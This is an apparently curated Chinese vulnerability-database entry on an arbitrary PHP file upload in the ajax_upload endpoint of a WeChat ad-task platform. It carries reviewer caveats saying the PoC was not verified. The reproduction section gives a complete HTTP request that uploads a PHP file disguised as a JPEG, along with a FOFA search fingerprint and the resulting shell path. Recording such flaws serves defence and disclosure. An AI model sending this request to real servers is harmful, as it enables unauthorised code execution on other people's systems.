---
source: "wy876 漏洞文库"
title: "微信广告任务平台（源码发行方未知） ajax_upload PHP上传"
product: "微信广告任务平台（源码发行方未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；PHP解析目录条件"
prerequisites: "携BJYADMIN会话，权限未述"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zhsn7ptr9pmr61nd"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0/%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0ajax_upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "/tpl/Public/js/func.js"
id: "vw-987564a06c6cecb7ed014434"
entity_id: "ve-987564a06c6cecb7ed014434"
schema_version: "1"
---

# 微信广告任务平台（源码发行方未知） ajax_upload PHP上传

## 条目说明

- 对象与具体问题：微信广告任务平台（源码发行方未知）；ajax_upload PHP上传
- 版本、配置及部署条件：版本未知；PHP解析目录条件
- 认证与权限前提：携BJYADMIN会话，权限未述
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 不能因为微信前缀归腾讯产品，需明确第三方源码身份
- 带管理会话且无匿名对照，不应当无认证
- phpinfo和随机日期路径没有HTTP响应/执行结果，持久文件需清理
- HTTP误标Java，补版本/补丁

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
微信广告任务平台ajax_upload存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## 二、影响版本
+ 微信广告任务平台

## 三、资产测绘
+ fofa`"/tpl/Public/js/func.js"`
+ 特征


## 四、漏洞复现
```http
POST /index.php/Home/index/ajax_upload HTTP/1.1
Host: 
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCc7iBZFp1mvojsxn
Accept: */*
Origin: http://127.0.0.1
Referer: http://127.0.0.1/index.php/Home/Index/index.html
Cookie: think_language=zh-CN; BJYADMIN=2150gjbkj92r835kg2dn9u9i75
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Safari/537.36

------WebKitFormBoundaryCc7iBZFp1mvojsxn
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundaryCc7iBZFp1mvojsxn--
```

> 请求长度说明：原资料 Content-Length 为 197；保留原始标头；其数值未据实际请求体重新计算或验证。


```java
https://xxxx/Uploads/images/2024-09-27/66f626b7a5af8.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zhsn7ptr9pmr61nd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
